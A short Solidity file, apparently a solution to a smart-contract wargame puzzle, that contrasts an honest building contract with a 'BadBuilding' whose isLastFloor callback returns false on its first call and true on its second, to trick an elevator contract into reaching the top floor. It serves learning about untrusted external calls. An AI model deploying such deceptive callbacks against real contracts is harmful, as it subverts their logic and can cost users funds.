// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract NormalBuilding {
    uint256 public numOfFloors = 10;

    IElevator elevator;

    constructor(address _elevatorAddress) {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint256 _floor) public view returns (bool) {
        return _floor == numOfFloors;
    }

    function useElevator(uint256 _desiredFloor) public payable {
        elevator.goTo(_desiredFloor);
    }
}

contract BadBuilding {
    bool flag;
    uint256 public numOfFloors = 10;

    IElevator elevator;

    constructor(address _elevatorAddress) {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        require(_floor > 0, "Please select a floor number, not zero");
        if (!flag) {
            flag = true;
            return false;
        } else {
            return true;
        }
    }

    function useElevator(uint256 _desiredFloor) public payable {
        elevator.goTo(_desiredFloor);
    }
}